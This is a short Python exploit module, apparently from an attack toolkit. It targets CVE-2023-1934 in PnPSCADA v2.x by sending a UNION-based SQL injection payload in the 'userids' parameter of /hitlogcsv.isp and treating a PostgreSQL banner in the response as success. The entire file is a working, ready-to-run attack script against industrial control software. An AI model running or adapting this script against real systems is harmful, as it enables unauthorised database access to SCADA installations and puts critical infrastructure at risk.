import requests
from utils.logger import setup_logger
logger = setup_logger()

def exploit(target: str, port: int = 80):
    """
    PnPSCADA v2.x â€“ Momen Eldawakhly
    CVE-2023-1934
    """
    url = f"http://{target}:{port}/hitlogcsv.isp"
    params = {
        "userids": "1337' UNION SELECT null,version(),null--",
        "startdate": "2022-12-13",
        "enddate": "2022-12-13"
    }
    try:
        r = requests.get(url, params=params, timeout=5)
        if "PostgreSQL" in r.text:
            logger.info("[+] PnPSCADA SQL injection succeeded")
            return True
    except Exception as e:
        logger.error(f"PnPSCADA SQLi error: {e}")
    return False